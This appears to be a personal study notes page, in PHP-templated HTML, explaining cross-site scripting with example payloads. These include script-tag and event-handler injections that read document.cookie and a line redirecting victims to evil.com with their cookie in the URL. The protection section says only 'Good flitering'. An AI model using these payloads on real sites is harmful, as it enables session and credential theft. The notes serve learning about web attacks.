<?php $iainPageTitle = 'XSS'; $docDepth = 1;?>
<?php include '../partials/head.php'; ?>


<p>
	Posting a message on a website with embedded javascript that, when opened by another user, will access their cookie data (username/password...) and do something with it.  Usually sending it to a site owned by the XSS author.
</p>

<a href="http://xssed.org/">xssed.org</a>

<h3>How to do XSS?</h3>
<p><strong>Example 1</strong></p>
<p>Imagin creating a site that gave users the ability to customize the colour scheme via paramaters in the URL, 
	<code>http://example.com/test.php?color=red&background=pink</code> so 'red' or 'pink' are directly placed into the stylesheet.  
	An XSS attack might look like this: <code>http://example.com/test.php?color=green&background=&lt;/style&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
	with the link being supplied by email / another site in order to attack the trusted (and vulnerable) example.com</p>
<a href="http://www.smashingmagazine.com/2010/01/14/web-security-primer-are-you-part-of-the-problem/">Source</a>
<p></p>
<hr />
<p><strong>Example 2</strong></p>
<p>
<ul>
	<li>
		Need the ability to send a message to other users on the site.
	</li>
	<li>
		Ususally focused on cookies that store username and password.
	</li>
	<li>
		This code will display a users cookie: <code>alert(document.cookie);</code> <a href="javascript:alert(document.cookie);">Check it out!</a>
	</li>
</ul>
So, if the site just copies the text from one user to another, this could be written:
<pre><code>&lt;script&gt;
alert(document.cookie);
&lt;/script&gt;</pre></code>

Or, if the &lt;script&gt; tags are being filtered:

<pre><code>&lt;a href="javascript:alert(document.cookie);"&gt;Click me&lt;/a&gt;

&lt;a href="advanced.html" onClick="alert(document.cookie)"&gt;test&lt;/a&gt;</code></pre>

Note: <code>onClick</code> requires the user to click, an alternative would be <a onMouseOver="alert(document.cookie);"><code>onMouseOver</code></a>.<br />
<br />
With that, if you are looking to aquire the cookie, redirect the user to a site you own and insert the cookie into the url:
<pre><code>&lt;script&gt;
document.location = 'http://evil.com/blah.cgi?cookie=' + document.cookie;
&lt;/script&gt;</pre></code>

Finally, if a site allows users to submit clickable links into text but doesn't filter spaces or quotation marks, this might be given as a URL:
<pre><code>http://foocome" onMouseOver="alert(document.cookie)</code></pre>
Which would result in:
<pre><code>&lt;a href="<strong>http://foocome" onMouseOver="alert(document.cookie)</strong>"&gt;http://foocome&lt;/a&gt;</code></pre>
</p>
<h3>Protecting against XSS?</h3>
<p>Good flitering</p>

<hr>
Sources:
<ul>
	<li>
		A good run through: <a href="http://www.steve.org.uk/Security/XSS/Tutorial/index.html">Steve's tutorial</a>
	</li>
</ul>

<?php $footerAddress = (ltrim($homePath,'"')) . 'partials/footer.php'; ?>
<?php include $footerAddress; ?>